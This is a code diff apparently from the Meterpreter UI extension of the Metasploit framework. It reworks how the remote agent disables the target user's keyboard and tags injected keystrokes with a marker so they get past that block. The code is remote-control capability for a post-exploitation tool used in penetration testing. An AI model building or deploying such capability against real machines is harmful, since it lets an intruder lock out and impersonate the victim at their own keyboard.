@@ -1,9 +1,9 @@
 #include "precomp.h"
 #include "common_metapi.h"
 #include "keyboard.h"
+#include "ui.h"
 #include <tchar.h>
 
-extern HMODULE hookLibrary;
 extern HINSTANCE hAppInstance;
 
 LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
@@ -22,21 +22,7 @@ DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
 
 	enable = met_api->packet.get_tlv_value_bool(request, TLV_TYPE_BOOL);
 
-	// If there's no hook library loaded yet
-	if (!hookLibrary)
-		extract_hook_library();
-
-	// If the hook library is loaded successfully...
-	if (hookLibrary)
-	{
-		DWORD(*enableKeyboardInput)(BOOL enable) = (DWORD(*)(BOOL))met_api->win_api.kernel32.GetProcAddress(
-			hookLibrary, "enable_keyboard_input");
-
-		if (enableKeyboardInput)
-			result = enableKeyboardInput(enable);
-	}
-	else
-		result = met_api->win_api.kernel32.GetLastError();
+	result = input_gate_set_kb(enable);
 
 	// Transmit the response
 	met_api->packet.transmit_response(result, remote, response);
@@ -318,18 +304,19 @@ DWORD request_ui_send_keys(Remote *remote, Packet *request)
 	Packet *response = met_api->packet.create_response(request);
 	DWORD result = ERROR_SUCCESS;
 	wchar_t *keys = met_api->string.utf8_to_wchar(met_api->packet.get_tlv_value_string(request, TLV_TYPE_KEYS_SEND));
-	if (keys) 
+	if (keys)
 	{
+		ULONG_PTR marker = input_gate_marker();
 		INPUT input[2] = {0};
 		input[0].type = INPUT_KEYBOARD;
 		input[0].ki.time = 0;
 		input[0].ki.wVk = 0;
-		input[0].ki.dwExtraInfo = 0;
+		input[0].ki.dwExtraInfo = marker;
 		input[0].ki.dwFlags = KEYEVENTF_UNICODE;
 		input[1].type = INPUT_KEYBOARD;
 		input[1].ki.time = 0;
 		input[1].ki.wVk = 0;
-		input[1].ki.dwExtraInfo = 0;
+		input[1].ki.dwExtraInfo = marker;
 		input[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
 		wchar_t *loopkeys = keys;
 		while (*loopkeys != 0) 
@@ -357,7 +344,7 @@ void ui_send_key(WORD keycode, DWORD flags)
 	input[0].type = INPUT_KEYBOARD;
 	input[0].ki.time = 0;
 	input[0].ki.wScan = met_api->win_api.user32.MapVirtualKeyA(keycode, MAPVK_VK_TO_VSC);
-	input[0].ki.dwExtraInfo = 0;
+	input[0].ki.dwExtraInfo = input_gate_marker();
 	input[0].ki.wVk = keycode;
 	input[0].ki.dwFlags = flags;
 	met_api->win_api.user32.SendInput(1, input, sizeof(INPUT));
